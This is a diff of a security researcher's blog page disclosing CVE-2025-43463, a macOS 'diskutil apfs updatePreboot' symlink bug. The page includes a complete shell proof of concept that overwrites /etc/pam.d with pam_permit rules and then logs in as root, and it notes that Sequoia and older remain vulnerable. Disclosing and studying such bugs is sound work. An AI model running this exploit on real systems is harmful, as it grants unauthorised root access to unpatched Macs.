@@ -1,19 +1,15 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug, part 2</h2><p>After <a href="/storagekit">this</a> was fixed, I found a very similar bug in <code>diskutil apfs updatePreboot</code>. I reported it in September 2025, and it was fixed in <a href="https://support.apple.com/en-ca/125634" target="_blank">macOS 26.1</a>:</p><pre><code>Impact: An app may be able to access sensitive user data
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug 2</h2><p>After <a href="/storagekit">this</a> was fixed, I found a nearly identical bug in <code>diskutil apfs updatePreboot</code>. I reported it in September 2025, and it was fixed in <a href="https://support.apple.com/en-ca/125634" target="_blank">macOS 26.1</a>:</p><pre><code>Impact: An app may be able to access sensitive user data
 Description: A parsing issue in the handling of directory paths was addressed with improved path validation.
 CVE-2025-43463: Amy (@asentientbot), Mickey Jin (@patch1t)
-</code></pre><p>Unfortunately (for me), <a href="https://x.com/patch1t" target="_blank">Mickey Jin</a> found it first! So I didn't get a bounty.</p><h3>sample code</h3><p>As before, it will login as root.</p><pre><code>wholeDevice=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
-diskutil apfs createcontainer $wholeDevice
-containerDevice=$(diskutil info -plist $wholeDevice | plutil -extract APFSContainerReference raw -)
-dataName=$(mktemp -u dataXXXXX)
-systemName=$(mktemp -u systemXXXXX)
-prebootName=$(mktemp -u prebootXXXXX)
-diskutil apfs addvolume $containerDevice APFS $dataName -role D
-diskutil apfs addvolume $containerDevice APFS $systemName -role S -sibling $dataName
-diskutil apfs addvolume $containerDevice APFS $prebootName -role B
+</code></pre><p>Unfortunately (for me), <a href="https://x.com/patch1t" target="_blank">Mickey Jin</a> found it first! So I didn't get a bounty.</p><p>Sequoia and older are still vulnerable.</p><h3>sample code</h3><p>As before, it will login as root.</p><pre><code>whole=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
+diskutil apfs createcontainer $whole
+container=$(diskutil info -plist $whole | plutil -extract APFSContainerReference raw -)
+diskutil apfs addvolume $container APFS evil_data -role D
+diskutil apfs addvolume $container APFS evil_system -role S -sibling evil_data
+diskutil apfs addvolume $container APFS evil_preboot -role B
 
-uuid=$(diskutil info -plist $systemName | plutil -extract VolumeUUID raw -)
-bugInput=/Volumes/$systemName/usr/standalone/i386/EfiLoginUI
-bugOutput=/Volumes/$prebootName/$uuid/usr/standalone/i386/EfiLoginUI
+bugInput=/Volumes/evil_system/usr/standalone/i386/EfiLoginUI
+bugOutput=/Volumes/evil_preboot/$(diskutil info -plist evil_system | plutil -extract VolumeUUID raw -)/usr/standalone/i386/EfiLoginUI
 mkdir -p $bugInput
 mkdir -p $(dirname $bugOutput)
 
@@ -22,7 +18,7 @@ account sufficient pam_permit.so
 session sufficient pam_permit.so' &gt; $bugInput/login
 ln -s /etc/pam.d "$bugOutput"
 
-diskutil apfs updatepreboot $systemName
+diskutil apfs updatepreboot evil_system
 
 login root
 </code></pre></div></body></html>
